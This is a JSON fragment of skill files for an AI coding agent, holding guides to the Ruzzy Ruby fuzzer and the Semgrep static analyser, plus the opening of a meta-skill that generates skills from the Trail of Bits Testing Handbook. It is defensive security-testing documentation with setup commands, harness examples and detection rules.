        "plugins/testing-handbook-skills/skills/ruzzy/SKILL.md": "---\nname: ruzzy\ntype: fuzzer\ndescription: >\n  Ruzzy is a coverage-guided Ruby fuzzer by Trail of Bits.\n  Use for fuzzing pure Ruby code and Ruby C extensions.\n---\n\n# Ruzzy\n\nRuzzy is a coverage-guided fuzzer for Ruby built on libFuzzer. It enables fuzzing both pure Ruby code and Ruby C extensions with sanitizer support for detecting memory corruption and undefined behavior.\n\n## When to Use\n\nRuzzy is currently the only production-ready coverage-guided fuzzer for Ruby.\n\n**Choose Ruzzy when:**\n- Fuzzing Ruby applications or libraries\n- Testing Ruby C extensions for memory safety issues\n- You need coverage-guided fuzzing for Ruby code\n- Working with Ruby gems that have native extensions\n\n## Quick Start\n\nSet up environment:\n```bash\nexport ASAN_OPTIONS=\"allocator_may_return_null=1:detect_leaks=0:use_sigaltstack=0\"\n```\n\nTest with the included toy example:\n```bash\nLD_PRELOAD=$(ruby -e 'require \"ruzzy\"; print Ruzzy::ASAN_PATH') \\\n    ruby -e 'require \"ruzzy\"; Ruzzy.dummy'\n```\n\nThis should quickly find a crash demonstrating that Ruzzy is working correctly.\n\n## Installation\n\n### Platform Support\n\nRuzzy supports Linux x86-64 and AArch64/ARM64. For macOS or Windows, use the [Dockerfile](https://github.com/trailofbits/ruzzy/blob/main/Dockerfile) or [development environment](https://github.com/trailofbits/ruzzy#developing).\n\n### Prerequisites\n\n- Linux x86-64 or AArch64/ARM64\n- Recent version of clang (tested back to 14.0.0, latest release recommended)\n- Ruby with gem installed\n\n### Installation Command\n\nInstall Ruzzy with clang compiler flags:\n\n```bash\nMAKE=\"make --environment-overrides V=1\" \\\nCC=\"/path/to/clang\" \\\nCXX=\"/path/to/clang++\" \\\nLDSHARED=\"/path/to/clang -shared\" \\\nLDSHAREDXX=\"/path/to/clang++ -shared\" \\\n    gem install ruzzy\n```\n\n**Environment variables explained:**\n- `MAKE`: Overrides make to respect subsequent environment variables\n- `CC`, `CXX`, `LDSHARED`, `LDSHAREDXX`: Ensure proper clang binaries are used for latest features\n\n### Troubleshooting Installation\n\nIf installation fails, enable debug output:\n\n```bash\nRUZZY_DEBUG=1 gem install --verbose ruzzy\n```\n\n### Verification\n\nVerify installation by running the toy example (see Quick Start section).\n\n## Writing a Harness\n\n### Fuzzing Pure Ruby Code\n\nPure Ruby fuzzing requires two scripts due to Ruby interpreter implementation details.\n\n**Tracer script (`test_tracer.rb`):**\n\n```ruby\n# frozen_string_literal: true\n\nrequire 'ruzzy'\n\nRuzzy.trace('test_harness.rb')\n```\n\n**Harness script (`test_harness.rb`):**\n\n```ruby\n# frozen_string_literal: true\n\nrequire 'ruzzy'\n\ndef fuzzing_target(input)\n  # Your code to fuzz here\n  if input.length == 4\n    if input[0] == 'F'\n      if input[1] == 'U'\n        if input[2] == 'Z'\n          if input[3] == 'Z'\n            raise\n          end\n        end\n      end\n    end\n  end\nend\n\ntest_one_input = lambda do |data|\n  fuzzing_target(data)\n  return 0\nend\n\nRuzzy.fuzz(test_one_input)\n```\n\nRun with:\n\n```bash\nLD_PRELOAD=$(ruby -e 'require \"ruzzy\"; print Ruzzy::ASAN_PATH') \\\n    ruby test_tracer.rb\n```\n\n### Fuzzing Ruby C Extensions\n\nC extensions can be fuzzed with a single harness file, no tracer needed.\n\n**Example harness for msgpack (`fuzz_msgpack.rb`):**\n\n```ruby\n# frozen_string_literal: true\n\nrequire 'msgpack'\nrequire 'ruzzy'\n\ntest_one_input = lambda do |data|\n  begin\n    MessagePack.unpack(data)\n  rescue Exception\n    # We're looking for memory corruption, not Ruby exceptions\n  end\n  return 0\nend\n\nRuzzy.fuzz(test_one_input)\n```\n\nRun with:\n\n```bash\nLD_PRELOAD=$(ruby -e 'require \"ruzzy\"; print Ruzzy::ASAN_PATH') \\\n    ruby fuzz_msgpack.rb\n```\n\n### Harness Rules\n\n| Do | Don't |\n|----|-------|\n| Catch Ruby exceptions if testing C extensions | Let Ruby exceptions crash the fuzzer |\n| Return 0 from test_one_input lambda | Return other values |\n| Keep harness deterministic | Use randomness or time-based logic |\n| Use tracer script for pure Ruby | Skip tracer for pure Ruby code |\n\n> **See Also:** For detailed harness writing techniques, patterns for handling complex inputs,\n> and advanced strategies, see the **fuzz-harness-writing** technique skill.\n\n## Compilation\n\n### Installing Gems with Sanitizers\n\nWhen installing Ruby gems with C extensions for fuzzing, compile with sanitizer flags:\n\n```bash\nMAKE=\"make --environment-overrides V=1\" \\\nCC=\"/path/to/clang\" \\\nCXX=\"/path/to/clang++\" \\\nLDSHARED=\"/path/to/clang -shared\" \\\nLDSHAREDXX=\"/path/to/clang++ -shared\" \\\nCFLAGS=\"-fsanitize=address,fuzzer-no-link -fno-omit-frame-pointer -fno-common -fPIC -g\" \\\nCXXFLAGS=\"-fsanitize=address,fuzzer-no-link -fno-omit-frame-pointer -fno-common -fPIC -g\" \\\n    gem install <gem-name>\n```\n\n### Build Flags\n\n| Flag | Purpose |\n|------|---------|\n| `-fsanitize=address,fuzzer-no-link` | Enable AddressSanitizer and fuzzer instrumentation |\n| `-fno-omit-frame-pointer` | Improve stack trace quality |\n| `-fno-common` | Better compatibility with sanitizers |\n| `-fPIC` | Position-independent code for shared libraries |\n| `-g` | Include debug symbols |\n\n## Running Campaigns\n\n### Environment Setup\n\nBefore running any fuzzing campaign, set ASAN_OPTIONS:\n\n```bash\nexport ASAN_OPTIONS=\"allocator_may_return_null=1:detect_leaks=0:use_sigaltstack=0\"\n```\n\n**Options explained:**\n1. `allocator_may_return_null=1`: Skip common low-impact allocation failures (DoS)\n2. `detect_leaks=0`: Ruby interpreter leaks data, ignore these for now\n3. `use_sigaltstack=0`: Ruby recommends disabling sigaltstack with ASan\n\n### Basic Run\n\n```bash\nLD_PRELOAD=$(ruby -e 'require \"ruzzy\"; print Ruzzy::ASAN_PATH') \\\n    ruby harness.rb\n```\n\n**Note:** `LD_PRELOAD` is required for sanitizer injection. Unlike `ASAN_OPTIONS`, do not export it as it may interfere with other programs.\n\n### With Corpus\n\n```bash\nLD_PRELOAD=$(ruby -e 'require \"ruzzy\"; print Ruzzy::ASAN_PATH') \\\n    ruby harness.rb /path/to/corpus\n```\n\n### Passing libFuzzer Options\n\nAll libFuzzer options can be passed as arguments:\n\n```bash\nLD_PRELOAD=$(ruby -e 'require \"ruzzy\"; print Ruzzy::ASAN_PATH') \\\n    ruby harness.rb /path/to/corpus -max_len=1024 -timeout=10\n```\n\nSee [libFuzzer options](https://llvm.org/docs/LibFuzzer.html#options) for full reference.\n\n### Reproducing Crashes\n\nRe-run a crash case by passing the crash file:\n\n```bash\nLD_PRELOAD=$(ruby -e 'require \"ruzzy\"; print Ruzzy::ASAN_PATH') \\\n    ruby harness.rb ./crash-253420c1158bc6382093d409ce2e9cff5806e980\n```\n\n### Interpreting Output\n\n| Output | Meaning |\n|--------|---------|\n| `INFO: Running with entropic power schedule` | Fuzzing campaign started |\n| `ERROR: AddressSanitizer: heap-use-after-free` | Memory corruption detected |\n| `SUMMARY: libFuzzer: fuzz target exited` | Ruby exception occurred |\n| `artifact_prefix='./'; Test unit written to ./crash-*` | Crash input saved |\n| `Base64: ...` | Base64 encoding of crash input |\n\n## Sanitizer Integration\n\n### AddressSanitizer (ASan)\n\nRuzzy includes a pre-compiled AddressSanitizer library:\n\n```bash\nLD_PRELOAD=$(ruby -e 'require \"ruzzy\"; print Ruzzy::ASAN_PATH') \\\n    ruby harness.rb\n```\n\nUse ASan for detecting:\n- Heap buffer overflows\n- Stack buffer overflows\n- Use-after-free\n- Double-free\n- Memory leaks (disabled by default in Ruzzy)\n\n### UndefinedBehaviorSanitizer (UBSan)\n\nRuzzy also includes UBSan:\n\n```bash\nLD_PRELOAD=$(ruby -e 'require \"ruzzy\"; print Ruzzy::UBSAN_PATH') \\\n    ruby harness.rb\n```\n\nUse UBSan for detecting:\n- Signed integer overflow\n- Null pointer dereferences\n- Misaligned memory access\n- Division by zero\n\n### Common Sanitizer Issues\n\n| Issue | Solution |\n|-------|----------|\n| Ruby interpreter leak warnings | Use `ASAN_OPTIONS=detect_leaks=0` |\n| Sigaltstack conflicts | Use `ASAN_OPTIONS=use_sigaltstack=0` |\n| Allocation failure spam | Use `ASAN_OPTIONS=allocator_may_return_null=1` |\n| LD_PRELOAD interferes with tools | Don't export it; set inline with ruby command |\n\n> **See Also:** For detailed sanitizer configuration, common issues, and advanced flags,\n> see the **address-sanitizer** and **undefined-behavior-sanitizer** technique skills.\n\n## Real-World Examples\n\n### Example: msgpack-ruby\n\nFuzzing the msgpack MessagePack parser for memory corruption.\n\n**Install with sanitizers:**\n\n```bash\nMAKE=\"make --environment-overrides V=1\" \\\nCC=\"/path/to/clang\" \\\nCXX=\"/path/to/clang++\" \\\nLDSHARED=\"/path/to/clang -shared\" \\\nLDSHAREDXX=\"/path/to/clang++ -shared\" \\\nCFLAGS=\"-fsanitize=address,fuzzer-no-link -fno-omit-frame-pointer -fno-common -fPIC -g\" \\\nCXXFLAGS=\"-fsanitize=address,fuzzer-no-link -fno-omit-frame-pointer -fno-common -fPIC -g\" \\\n    gem install msgpack\n```\n\n**Harness (`fuzz_msgpack.rb`):**\n\n```ruby\n# frozen_string_literal: true\n\nrequire 'msgpack'\nrequire 'ruzzy'\n\ntest_one_input = lambda do |data|\n  begin\n    MessagePack.unpack(data)\n  rescue Exception\n    # We're looking for memory corruption, not Ruby exceptions\n  end\n  return 0\nend\n\nRuzzy.fuzz(test_one_input)\n```\n\n**Run:**\n\n```bash\nexport ASAN_OPTIONS=\"allocator_may_return_null=1:detect_leaks=0:use_sigaltstack=0\"\nLD_PRELOAD=$(ruby -e 'require \"ruzzy\"; print Ruzzy::ASAN_PATH') \\\n    ruby fuzz_msgpack.rb\n```\n\n### Example: Pure Ruby Target\n\nFuzzing pure Ruby code with a custom parser.\n\n**Tracer (`test_tracer.rb`):**\n\n```ruby\n# frozen_string_literal: true\n\nrequire 'ruzzy'\n\nRuzzy.trace('test_harness.rb')\n```\n\n**Harness (`test_harness.rb`):**\n\n```ruby\n# frozen_string_literal: true\n\nrequire 'ruzzy'\nrequire_relative 'my_parser'\n\ntest_one_input = lambda do |data|\n  begin\n    MyParser.parse(data)\n  rescue StandardError\n    # Expected exceptions from malformed input\n  end\n  return 0\nend\n\nRuzzy.fuzz(test_one_input)\n```\n\n**Run:**\n\n```bash\nexport ASAN_OPTIONS=\"allocator_may_return_null=1:detect_leaks=0:use_sigaltstack=0\"\nLD_PRELOAD=$(ruby -e 'require \"ruzzy\"; print Ruzzy::ASAN_PATH') \\\n    ruby test_tracer.rb\n```\n\n## Troubleshooting\n\n| Problem | Cause | Solution |\n|---------|-------|----------|\n| Installation fails | Wrong clang version or path | Verify clang path, use clang 14.0.0+ |\n| `cannot open shared object file` | LD_PRELOAD not set | Set LD_PRELOAD inline with ruby command |\n| Fuzzer immediately exits | Missing corpus directory | Create corpus directory or pass as argument |\n| No coverage progress | Pure Ruby needs tracer | Use tracer script for pure Ruby code |\n| Leak detection spam | Ruby interpreter leaks | Set `ASAN_OPTIONS=detect_leaks=0` |\n| Installation debug needed | Compilation errors | Use `RUZZY_DEBUG=1 gem install --verbose ruzzy` |\n\n## Related Skills\n\n### Technique Skills\n\n| Skill | Use Case |\n|-------|----------|\n| **fuzz-harness-writing** | Detailed guidance on writing effective harnesses |\n| **address-sanitizer** | Memory error detection during fuzzing |\n| **undefined-behavior-sanitizer** | Detecting undefined behavior in C extensions |\n| **libfuzzer** | Understanding libFuzzer options (Ruzzy is built on libFuzzer) |\n\n### Related Fuzzers\n\n| Skill | When to Consider |\n|-------|------------------|\n| **libfuzzer** | When fuzzing Ruby C extension code directly in C/C++ |\n| **aflpp** | Alternative approach for fuzzing Ruby by instrumenting Ruby interpreter |\n\n## Resources\n\n### Key External Resources\n\n**[Introducing Ruzzy, a coverage-guided Ruby fuzzer](https://blog.trailofbits.com/2024/03/29/introducing-ruzzy-a-coverage-guided-ruby-fuzzer/)**\nOfficial Trail of Bits blog post announcing Ruzzy, covering motivation, architecture, and initial results.\n\n**[Ruzzy GitHub Repository](https://github.com/trailofbits/ruzzy)**\nSource code, additional examples, and development instructions.\n\n**[libFuzzer Documentation](https://llvm.org/docs/LibFuzzer.html)**\nSince Ruzzy is built on libFuzzer, understanding libFuzzer options and behavior is valuable.\n\n**[Fuzzing Ruby C extensions](https://github.com/trailofbits/ruzzy#fuzzing-ruby-c-extensions)**\nDetailed guide on fuzzing C extensions with compilation flags and examples.\n\n**[Fuzzing pure Ruby code](https://github.com/trailofbits/ruzzy#fuzzing-pure-ruby-code)**\nDetailed guide on the tracer pattern required for pure Ruby fuzzing.\n",
        "plugins/testing-handbook-skills/skills/semgrep/SKILL.md": "---\nname: semgrep\ntype: tool\ndescription: >\n  Semgrep is a fast static analysis tool for finding bugs and enforcing code standards.\n  Use when scanning code for security issues or integrating into CI/CD pipelines.\n---\n\n# Semgrep\n\nSemgrep is a highly efficient static analysis tool for finding low-complexity bugs and locating specific code patterns. Because of its ease of use, no need to build the code, multiple built-in rules, and convenient creation of custom rules, it is usually the first tool to run on an audited codebase. Furthermore, Semgrep's integration into the CI/CD pipeline makes it a good choice for ensuring code quality.\n\n**Key benefits:**\n- Prevents re-entry of known bugs and security vulnerabilities\n- Enables large-scale code refactoring, such as upgrading deprecated APIs\n- Easily added to CI/CD pipelines\n- Custom Semgrep rules mimic the semantics of actual code\n- Allows for secure scanning without sharing code with third parties\n- Scanning usually takes minutes (not hours/days)\n- Easy to use and accessible for both developers and security professionals\n\n## When to Use\n\n**Use Semgrep when:**\n- Looking for bugs with easy-to-identify patterns\n- Analyzing single files (intraprocedural analysis)\n- Detecting systemic bugs (multiple instances across codebase)\n- Enforcing secure defaults and code standards\n- Performing rapid initial security assessment\n- Scanning code without building it first\n\n**Consider alternatives when:**\n- Multiple files are required for analysis  Consider Semgrep Pro Engine or CodeQL\n- Complex flow analysis is needed  Consider CodeQL\n- Advanced taint tracking across files  Consider CodeQL or Semgrep Pro\n- Custom in-house framework analysis  May need specialized tooling\n\n## Quick Reference\n\n| Task | Command |\n|------|---------|\n| Scan with auto-detection | `semgrep --config auto` |\n| Scan with specific ruleset | `semgrep --config=\"p/trailofbits\"` |\n| Scan with custom rules | `semgrep -f /path/to/rules` |\n| Output to SARIF format | `semgrep -c p/default --sarif --output scan.sarif` |\n| Test custom rules | `semgrep --test` |\n| Disable metrics | `semgrep --metrics=off --config=auto` |\n| Filter by severity | `semgrep --config=auto --severity ERROR` |\n| Show dataflow traces | `semgrep --dataflow-traces -f rule.yml` |\n\n## Installation\n\n### Prerequisites\n\n- Python 3.7 or later (for pip installation)\n- macOS, Linux, or Windows\n- Homebrew (optional, for macOS/Linux)\n\n### Install Steps\n\n**Via Python Package Installer:**\n\n```bash\npython3 -m pip install semgrep\n```\n\n**Via Homebrew (macOS/Linux):**\n\n```bash\nbrew install semgrep\n```\n\n**Via Docker:**\n\n```bash\ndocker pull returntocorp/semgrep\n```\n\n### Keeping Semgrep Updated\n\n```bash\n# Check current version\nsemgrep --version\n\n# Update via pip\npython3 -m pip install --upgrade semgrep\n\n# Update via Homebrew\nbrew upgrade semgrep\n```\n\n### Verification\n\n```bash\nsemgrep --version\n```\n\n## Core Workflow\n\n### Step 1: Initial Scan\n\nStart with an auto-configuration scan to evaluate Semgrep's effectiveness:\n\n```bash\nsemgrep --config auto\n```\n\n**Important:** Auto mode submits metrics online. To disable:\n\n```bash\nexport SEMGREP_SEND_METRICS=off\n# OR\nsemgrep --metrics=off --config auto\n```\n\n### Step 2: Select Targeted Rulesets\n\nUse the [Semgrep Registry](https://semgrep.dev/explore) to select rulesets:\n\n```bash\n# Security-focused rulesets\nsemgrep --config=\"p/trailofbits\"\nsemgrep --config=\"p/cwe-top-25\"\nsemgrep --config=\"p/owasp-top-ten\"\n\n# Language-specific\nsemgrep --config=\"p/javascript\"\n\n# Multiple rulesets\nsemgrep --config=\"p/trailofbits\" --config=\"p/r2c-security-audit\"\n```\n\n### Step 3: Review and Triage Results\n\nFilter results by severity:\n\n```bash\nsemgrep --config=auto --severity ERROR\n```\n\nUse output formats for easier analysis:\n\n```bash\n# SARIF for VS Code SARIF Explorer\nsemgrep -c p/default --sarif --output scan.sarif\n\n# JSON for automation\nsemgrep -c p/default --json --output scan.json\n```\n\n### Step 4: Configure Ignored Files\n\nCreate `.semgrepignore` file to exclude paths:\n\n```\n# Ignore specific files/directories\npath/to/ignore/file.ext\npath_to_ignore/\n\n# Ignore by extension\n*.ext\n\n# Include .gitignore patterns\n:include .gitignore\n```\n\n**Note:** By default, Semgrep skips `/tests`, `/test`, and `/vendors` folders.\n\n## How to Customize\n\n### Writing Custom Rules\n\nSemgrep rules are YAML files with pattern-matching syntax. Basic structure:\n\n```yaml\nrules:\n  - id: rule-id\n    languages: [go]\n    message: Some message\n    severity: ERROR # INFO / WARNING / ERROR\n    pattern: test(...)\n```\n\n### Running Custom Rules\n\n```bash\n# Single file\nsemgrep --config custom_rule.yaml\n\n# Directory of rules\nsemgrep --config path/to/rules/\n```\n\n### Key Syntax Reference\n\n| Syntax/Operator | Description | Example |\n|-----------------|-------------|---------|\n| `...` | Match zero or more arguments/statements | `func(..., arg=value, ...)` |\n| `$X`, `$VAR` | Metavariable (captures and tracks values) | `$FUNC($INPUT)` |\n| `<... ...>` | Deep expression operator (nested matching) | `if <... user.is_admin() ...>:` |\n| `pattern-inside` | Match only within context | Pattern inside a loop |\n| `pattern-not` | Exclude specific patterns | Negative matching |\n| `pattern-either` | Logical OR (any pattern matches) | Multiple alternatives |\n| `patterns` | Logical AND (all patterns match) | Combined conditions |\n| `metavariable-pattern` | Nested metavariable constraints | Constrain captured values |\n| `metavariable-comparison` | Compare metavariable values | `$X > 1337` |\n\n### Example: Detecting Insecure Request Verification\n\n```yaml\nrules:\n  - id: requests-verify-false\n    languages: [python]\n    message: requests.get with verify=False disables SSL verification\n    severity: WARNING\n    pattern: requests.get(..., verify=False, ...)\n```\n\n### Example: Taint Mode for SQL Injection\n\n```yaml\nrules:\n  - id: sql-injection\n    mode: taint\n    pattern-sources:\n      - pattern: request.args.get(...)\n    pattern-sinks:\n      - pattern: cursor.execute($QUERY)\n    pattern-sanitizers:\n      - pattern: int(...)\n    message: Potential SQL injection with unsanitized user input\n    languages: [python]\n    severity: ERROR\n```\n\n### Testing Custom Rules\n\nCreate test files with annotations:\n\n```python\n# ruleid: requests-verify-false\nrequests.get(url, verify=False)\n\n# ok: requests-verify-false\nrequests.get(url, verify=True)\n```\n\nRun tests:\n\n```bash\nsemgrep --test ./path/to/rules/\n```\n\nFor autofix testing, create `.fixed` files (e.g., `test.py`  `test.fixed.py`):\n\n```bash\nsemgrep --test\n# Output: 1/1:  All tests passed\n#         1/1:  All fix tests passed\n```\n\n## Configuration\n\n### Configuration File\n\nSemgrep doesn't require a central config file. Configuration is done via:\n- Command-line flags\n- Environment variables\n- `.semgrepignore` for path exclusions\n\n### Ignore Patterns\n\nCreate `.semgrepignore` in repository root:\n\n```\n# Ignore directories\ntests/\nvendor/\nnode_modules/\n\n# Ignore file types\n*.min.js\n*.generated.go\n\n# Include .gitignore patterns\n:include .gitignore\n```\n\n### Suppressing False Positives\n\nAdd inline comments to suppress specific findings:\n\n```python\n# nosemgrep: rule-id\nrisky_function()\n```\n\n**Best practices:**\n- Specify the exact rule ID (not generic `# nosemgrep`)\n- Explain why the rule is disabled\n- Report false positives to improve rules\n\n### Metadata in Custom Rules\n\nInclude metadata for better context:\n\n```yaml\nrules:\n  - id: example-rule\n    metadata:\n      cwe: \"CWE-89\"\n      confidence: HIGH\n      likelihood: MEDIUM\n      impact: HIGH\n      subcategory: vuln\n    # ... rest of rule\n```\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| Use `--time` flag | Identifies slow rules and files for optimization |\n| Limit ellipsis usage | Reduces false positives and improves performance |\n| Use `pattern-inside` for context | Creates clearer, more focused findings |\n| Enable autocomplete | Speeds up command-line workflow |\n| Use `focus-metavariable` | Highlights specific code locations in output |\n\n### Scanning Non-Standard Extensions\n\nForce language interpretation for unusual file extensions:\n\n```bash\nsemgrep --config=/path/to/config --lang python --scan-unknown-extensions /path/to/file.xyz\n```\n\n### Dataflow Tracing\n\nUse `--dataflow-traces` to understand how values flow to findings:\n\n```bash\nsemgrep --dataflow-traces -f taint_rule.yml test.py\n```\n\nExample output:\n\n```\nTaint comes from:\n  test.py\n    2 data = get_user_input()\n\nThis is how taint reaches the sink:\n  test.py\n    3 return output(data)\n```\n\n### Polyglot File Scanning\n\nScan embedded languages (e.g., JavaScript in HTML):\n\n```yaml\nrules:\n  - id: eval-in-html\n    languages: [html]\n    message: eval in JavaScript\n    patterns:\n      - pattern: <script ...>$Y</script>\n      - metavariable-pattern:\n          metavariable: $Y\n          language: javascript\n          patterns:\n            - pattern: eval(...)\n    severity: WARNING\n```\n\n### Constant Propagation\n\nMatch instances where metavariables hold specific values:\n\n```yaml\nrules:\n  - id: high-value-check\n    languages: [python]\n    message: $X is higher than 1337\n    patterns:\n      - pattern: function($X)\n      - metavariable-comparison:\n          metavariable: $X\n          comparison: $X > 1337\n    severity: WARNING\n```\n\n### Autofix Feature\n\nAdd automatic fixes to rules:\n\n```yaml\nrules:\n  - id: ioutil-readdir-deprecated\n    languages: [golang]\n    message: ioutil.ReadDir is deprecated. Use os.ReadDir instead.\n    severity: WARNING\n    pattern: ioutil.ReadDir($X)\n    fix: os.ReadDir($X)\n```\n\nPreview fixes without applying:\n\n```bash\nsemgrep -f rule.yaml --dryrun --autofix\n```\n\nApply fixes:\n\n```bash\nsemgrep -f rule.yaml --autofix\n```\n\n### Performance Optimization\n\nAnalyze performance:\n\n```bash\nsemgrep --config=auto --time\n```\n\nOptimize rules:\n1. Use `paths` to narrow file scope\n2. Minimize ellipsis usage\n3. Use `pattern-inside` to establish context first\n4. Remove unnecessary metavariables\n\n### Managing Third-Party Rules\n\nUse [semgrep-rules-manager](https://github.com/iosifache/semgrep-rules-manager/) to collect third-party rules:\n\n```bash\npip install semgrep-rules-manager\nmkdir -p $HOME/custom-semgrep-rules\nsemgrep-rules-manager --dir $HOME/custom-semgrep-rules download\nsemgrep -f $HOME/custom-semgrep-rules\n```\n\n## CI/CD Integration\n\n### GitHub Actions\n\n#### Recommended Approach\n\n1. Full scan on main branch with broad rulesets (scheduled)\n2. Diff-aware scanning for pull requests with focused rules\n3. Block PRs with unresolved findings (once mature)\n\n#### Example Workflow\n\n```yaml\nname: Semgrep\non:\n  pull_request: {}\n  push:\n    branches: [\"master\", \"main\"]\n  schedule:\n    - cron: '0 0 1 * *' # Monthly\n\njobs:\n  semgrep-schedule:\n    if: ((github.event_name == 'schedule' || github.event_name == 'push' || github.event.pull_request.merged == true)\n        && github.actor != 'dependabot[bot]')\n    name: Semgrep default scan\n    runs-on: ubuntu-latest\n    container:\n      image: returntocorp/semgrep\n    steps:\n      - name: Checkout main repository\n        uses: actions/checkout@v4\n      - run: semgrep ci\n        env:\n          SEMGREP_RULES: p/default\n\n  semgrep-pr:\n    if: (github.event_name == 'pull_request' && github.actor != 'dependabot[bot]')\n    name: Semgrep PR scan\n    runs-on: ubuntu-latest\n    container:\n      image: returntocorp/semgrep\n    steps:\n      - uses: actions/checkout@v4\n      - run: semgrep ci\n        env:\n          SEMGREP_RULES: >\n            p/cwe-top-25\n            p/owasp-top-ten\n            p/r2c-security-audit\n            p/trailofbits\n```\n\n#### Adding Custom Rules in CI\n\n**Rules in same repository:**\n\n```yaml\nenv:\n  SEMGREP_RULES: p/default custom-semgrep-rules-dir/\n```\n\n**Rules in private repository:**\n\n```yaml\nenv:\n  SEMGREP_PRIVATE_RULES_REPO: semgrep-private-rules\nsteps:\n  - name: Checkout main repository\n    uses: actions/checkout@v4\n  - name: Checkout private custom Semgrep rules\n    uses: actions/checkout@v4\n    with:\n      repository: ${{ github.repository_owner }}/${{ env.SEMGREP_PRIVATE_RULES_REPO }}\n      token: ${{ secrets.SEMGREP_RULES_TOKEN }}\n      path: ${{ env.SEMGREP_PRIVATE_RULES_REPO }}\n  - run: semgrep ci\n    env:\n      SEMGREP_RULES: ${{ env.SEMGREP_PRIVATE_RULES_REPO }}\n```\n\n### Testing Rules in CI\n\n```yaml\nname: Test Semgrep rules\n\non: [push, pull_request]\n\njobs:\n  semgrep-test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-python@v4\n        with:\n          python-version: \"3.11\"\n          cache: \"pip\"\n      - run: python -m pip install -r requirements.txt\n      - run: semgrep --test --test-ignore-todo ./path/to/rules/\n```\n\n## Common Mistakes\n\n| Mistake | Why It's Wrong | Correct Approach |\n|---------|----------------|------------------|\n| Using `--config auto` on private code | Sends metadata to Semgrep servers | Use `--metrics=off` or specific rulesets |\n| Forgetting `.semgrepignore` | Scans excluded directories like `/vendor` | Create `.semgrepignore` file |\n| Not testing rules with false positives | Rules generate noise | Add `# ok:` test cases |\n| Using generic `# nosemgrep` | Makes code review harder | Use `# nosemgrep: rule-id` with explanation |\n| Overusing ellipsis `...` | Degrades performance and accuracy | Use specific patterns when possible |\n| Not including metadata in rules | Makes triage difficult | Add CWE, confidence, impact fields |\n\n## Limitations\n\n- **Single-file analysis:** Cannot track data flow across files without Semgrep Pro Engine\n- **No build required:** Cannot analyze compiled code or resolve dynamic dependencies\n- **Pattern-based:** May miss vulnerabilities requiring deep semantic understanding\n- **Limited taint tracking:** Complex taint analysis is still evolving\n- **Custom frameworks:** In-house proprietary frameworks may not be well-supported\n\n## Related Skills\n\n| Skill | When to Use Together |\n|-------|---------------------|\n| **codeql** | For cross-file taint tracking and complex data flow analysis |\n| **sarif-parsing** | For processing Semgrep SARIF output in pipelines |\n\n## Resources\n\n### Key External Resources\n\n**[Trail of Bits public Semgrep rules](https://github.com/trailofbits/semgrep-rules)**\nCommunity-contributed Semgrep rules for security audits, with contribution guidelines and quality standards.\n\n**[Semgrep Registry](https://semgrep.dev/explore)**\nOfficial registry of Semgrep rules, searchable by language, framework, and security category.\n\n**[Semgrep Playground](https://semgrep.dev/playground/new)**\nInteractive online tool for writing and testing Semgrep rules. Use \"simple mode\" for easy pattern combination.\n\n**[Learn Semgrep Syntax](https://semgrep.dev/learn)**\nComprehensive guide on Semgrep rule-writing fundamentals.\n\n**[Trail of Bits Blog: How to introduce Semgrep to your organization](https://blog.trailofbits.com/2024/01/12/how-to-introduce-semgrep-to-your-organization/)**\nSeven-step plan for organizational adoption of Semgrep, including pilot testing, evangelization, and CI/CD integration.\n\n**[Trail of Bits Blog: Discovering goroutine leaks with Semgrep](https://blog.trailofbits.com/2021/11/08/discovering-goroutine-leaks-with-semgrep/)**\nReal-world example of writing custom rules to detect Go-specific issues.\n\n### Video Resources\n\n- [Introduction to Semgrep - Trail of Bits Webinar](https://www.youtube.com/watch?v=yKQlTbVlf0Q)\n- [Detect complex code patterns using semantic grep](https://www.youtube.com/watch?v=IFRp2Y3cqOw)\n- [Semgrep part 1 - Embrace Secure Defaults, Block Anti-patterns and more](https://www.youtube.com/watch?v=EIjoqwT53E4)\n- [Semgrep Weekly Wednesday Office Hours: Modifying Rules to Reduce False Positives](https://www.youtube.com/watch?v=VSL44ZZ7EvY)\n- [Raining CVEs On WordPress Plugins With Semgrep | Nullcon Goa 2022](https://www.youtube.com/watch?v=RvKLn2ofMAo)\n",
        "plugins/testing-handbook-skills/skills/testing-handbook-generator/SKILL.md": "---\nname: testing-handbook-generator\ndescription: >\n  Meta-skill that analyzes the Trail of Bits Testing Handbook (appsec.guide)\n  and generates Claude Code skills for security testing tools and techniques.\n  Use when creating new skills based on handbook content.\n---\n\n# Testing Handbook Skill Generator\n\nGenerate and maintain Claude Code skills from the Trail of Bits Testing Handbook.\n\n## When to Use\n\n**Invoke this skill when:**\n- Creating new security testing skills from handbook content\n- User mentions \"testing handbook\", \"appsec.guide\", or asks about generating skills\n- Bulk skill generation or refresh is needed\n\n**Do NOT use for:**\n- General security testing questions (use the generated skills)\n- Non-handbook skill creation\n\n## Handbook Location\n\nThe skill needs the Testing Handbook repository. See [discovery.md](discovery.md) for full details.\n\n**Quick reference:** Check `./testing-handbook`, `../testing-handbook`, `~/testing-handbook`  ask user  clone as last resort.\n\n**Repository:** `https://github.com/trailofbits/testing-handbook`\n\n## Workflow Overview\n\n```\nPhase 0: Setup              Phase 1: Discovery\n        \n Locate handbook         Analyze handbook\n - Find or clone          - Scan sections \n - Confirm path           - Classify types\n        \n                                   \nPhase 3: Generation        Phase 2: Planning\n        \n TWO-PASS GEN            Generate plan   \n Pass 1: Content          - New skills    \n Pass 2: X-refs           - Updates       \n - Write to gen/          - Present user  \n        \n         \nPhase 4: Testing           Phase 5: Finalize\n        \n Validate skills         Post-generation \n - Run validator          - Update README \n - Test activation        - Update X-refs \n - Fix issues             - Self-improve  \n        \n```\n\n## Scope Restrictions\n\n**ONLY modify these locations:**\n- `plugins/testing-handbook-skills/skills/[skill-name]/*` - Generated skills (as siblings to testing-handbook-generator)\n- `plugins/testing-handbook-skills/skills/testing-handbook-generator/*` - Self-improvement\n- Repository root `README.md` - Add generated skills to table\n\n**NEVER modify or analyze:**\n- Other plugins (`plugins/property-based-testing/`, `plugins/static-analysis/`, etc.)\n- Other skills outside this plugin\n\nDo not scan or pull into context any skills outside of `testing-handbook-skills/`. Generate skills based solely on handbook content and resources referenced from it.\n\n## Quick Reference\n\n### Section  Skill Type Mapping\n\n| Handbook Section | Skill Type | Template |\n|------------------|------------|----------|\n| `/static-analysis/[tool]/` | Tool Skill | tool-skill.md |\n| `/fuzzing/[lang]/[fuzzer]/` | Fuzzer Skill | fuzzer-skill.md |\n| 